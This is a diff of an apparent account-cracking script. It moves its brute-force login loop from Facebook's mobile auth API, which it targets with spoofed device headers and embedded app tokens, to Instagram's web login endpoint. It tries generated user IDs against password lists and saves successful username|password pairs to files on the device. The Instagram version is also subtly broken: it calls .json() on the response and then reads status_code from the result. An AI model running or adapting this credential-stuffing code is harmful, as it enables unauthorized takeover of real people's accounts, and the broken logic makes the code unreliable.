@@ -102,7 +102,7 @@ def random_number():
     except ValueError:
         limit = 5000
     for _ in range(limit):
-        x = "".join(random.choice(string.digits) for _ in range(7))
+        x = "".join(random.choice(string.digits) for _ in range(6))
         idz.append(x)
     with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
@@ -137,71 +137,48 @@ def crack(uid, pww, total_idz):
     sys.stdout.flush()
     try:
         for pw in pww:
-            fb_version = str(random.randint(100,436))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(100,150))
-            fb_version_code = str(random.randint(111111111,999999999))
-            uppercase_letter = "".join(random.choice(string.ascii_uppercase))
-            three_digit = "".join(random.choice(string.digits) for _ in range(3))
-            device_model = f"SM-{uppercase_letter}{three_digit}{uppercase_letter}"
-            android_version = str(random.randint(8,13))
-            ua = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density=3.2,width=1080,height=1920}};FBLC/en_GB;FBRV/631869122;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device_model});FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
-            sex = random.choice(["Liger", "METERED", "MOBILE.EDGE", "MOBILE.HSPA", "MOBILE.LTE", "MODERATE"])
+            session = requests.Session()
+            initial_response = session.get("https://www.instagram.com/accounts/login/")
+            csrf_token = initial_response.cookies.get("csrftoken")
+            time_now = int(time.time())
+            device_id = f"android-{str(uuid.uuid4())[:16]}"
+            adid = str(uuid.uuid4()) 
+            guid = str(uuid.uuid4()) 
+            phone_id = str(uuid.uuid4())
             data = {
-                "adid": str(uuid.uuid4()),
-                "format": "json",
-                "device_id": str(uuid.uuid4()),
-                "cpl": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "register_api",
-                "email": uid,
-                "password": pw,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "NO_FILE",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "locale": "en_PK",
-                "device": "Samsung",
-                "sdk": "Android",
-                "client_country_code": "PK",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
+                "username": uid,
+                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}",
+                "queryParams": "{}",
+                "optIntoOneTap": False,
+                "stopDeletionNonce": "",
+                "trustedDeviceRecords": "{}",
+                "login_attempt_count": "0",
+                "device_id": device_id,
+                "adid": adid,
+                "guid": guid,
+                "phone_id": phone_id,
+                "login_nonce_map": "{}",
+                "big_blue_token": "",
+                "country_codes": "[{\"country_code\":\"1\",\"source\":[\"default\"]}]",
+                "jazoest": "22240",  # A calculated checksum, often needed for Instagram (value is an example)
+                "user_id": "",
+                "csrftoken": csrf_token,
+                "ds_user_id": "",
+                "_csrftoken": csrf_token,
+                "sessionid": ""}
             headers = {
-                "User-Agent": ua,
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+                "X-Requested-With": "XMLHttpRequest",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-                "X-FB-Connection-Type": sex,
-                "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
-                "X-FB-Connection-Quality": sex,
-                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            }
-            url = "https://b-graph.facebook.com/auth/login"
-            po = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in po:
+                "X-CSRFToken": csrf_token,
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "Origin": "https://www.instagram.com",}
+            login_url = "https://www.instagram.com/accounts/login/ajax/"
+            response = requests.post(login_url, data=data, headers=headers).json()
+            if response.status_code == 200 and response.json().get("authenticated"):
                 print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
                 open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                 oks.append(uid)
-                break
-            elif "www.facebook.com" in po["error"]["message"]:
-                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-                print(f"\r{cpclr} [XYZ-CP] {uid} | {pw}")
-                open("/sdcard/XYZ/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid)
                 break
             else:
                 continue
